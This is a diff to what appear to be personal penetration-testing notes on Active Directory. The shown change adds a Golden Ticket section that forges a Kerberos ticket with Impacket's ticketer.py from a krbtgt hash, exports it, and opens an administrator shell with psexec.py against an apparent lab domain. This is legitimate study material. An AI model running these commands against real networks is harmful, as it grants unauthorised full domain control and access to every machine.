@@ -65,11 +65,30 @@ This tells us information about what kind of passwords the client's user account
 
 ## Golden Ticket Attack:
 
-* When we compromise a specific account - krbtgt - we will own the domain. This is the Kerberos Ticket Granting Ticket - allows us to generate tickets.&#x20;
-* This means we can use this to request access to any resource or system on the domain, using the ticket granting service through forging a TGT - this will be our Golden Ticket.&#x20;
-* It works because the KDC trusts anything signed with the krbtgt key. Thus, the DC doesn't check if the username specified in the attack actually exists or not.&#x20;
-* Golden ticket literally means complete access to every machine in the AD (access to shells, files, folders etc.)
+* Forged a ticket that's signed with krbtgt service account's hash. Specifically this one - it's the KDC's service account.
+* If you have this, you can create a ticket for and impersonate any user - not just administrator. This means full domain compromise. 
+* When this ticket is decrypted by the DC, the attacker can have unrestricted access to anything in the domain.
 
+
+Method (with Impacket's Ticketer):
+
+1. Create a TGT claiming to be administrator. Will create a CCache (Credential Cache) file storing the TGT claiming to be the administrator.
+
+```shellscript
+root@kali:~# python ticketer.py -nthash [KRBTGT Hash] -domain-sid [Domain SID] -domain spookysec.local administrator
+```
+
+2. Export the ticket. This tells Kerberos to use the ticket stored in the standard location KRB5CCNAME where legitimate Kerberos tickets would be stored otherwise.
+
+```shellscript
+root@kali:~# export KRB5CCNAME=./administrator.ccache
+```
+
+3. Use the ticket. Will result in an admin shell. Signature looks valid to the DC (signed with the krbtgt account hash) so it will be accepted completely. 
+
+```shellscript
+root@kali:~# psexec.py -k -no-pass [Domain]/[Username - in this case, administrator]@[DC IP]
+```
 
 
 Method (with Mimikatz):
